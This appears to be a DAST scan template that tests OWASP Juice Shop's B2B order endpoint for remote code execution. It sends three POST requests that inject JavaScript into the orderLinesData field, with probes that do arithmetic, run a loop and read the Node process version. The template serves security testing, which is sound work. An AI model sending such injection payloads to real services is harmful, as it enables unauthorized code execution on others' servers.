id: juice-shop-b2b-rce
info:
  name: B2B Order RCE via JavaScript Injection
  author: dast-mvp
  severity: critical
  description: Tests for Remote Code Execution in B2B order processing
  tags:
    - juice-shop
    - rce
    - code-injection

requests:
  - path: /b2b/v2/orders
    method: POST
    headers:
      Content-Type: application/json
    body: '{"orderLinesData":"(function(){return 2+2})()"}'
    matchers_condition: and
    matchers:
      - type: status
        status:
          - 200
          - 401
      - type: word
        words:
          - orderNo
          - B2B
        condition: or

  - path: /b2b/v2/orders
    method: POST
    headers:
      Content-Type: application/json
    body: '{"orderLinesData":"(function(){var x=1; while(x<10){x++;} return x;})()"}'
    matchers:
      - type: status
        status:
          - 200
          - 401
          - 503

  - path: /b2b/v2/orders
    method: POST
    headers:
      Content-Type: application/json
    body: '{"orderLinesData":"(function(){return global.process.version})()"}'
    matchers:
      - type: status
        status:
          - 200
          - 401
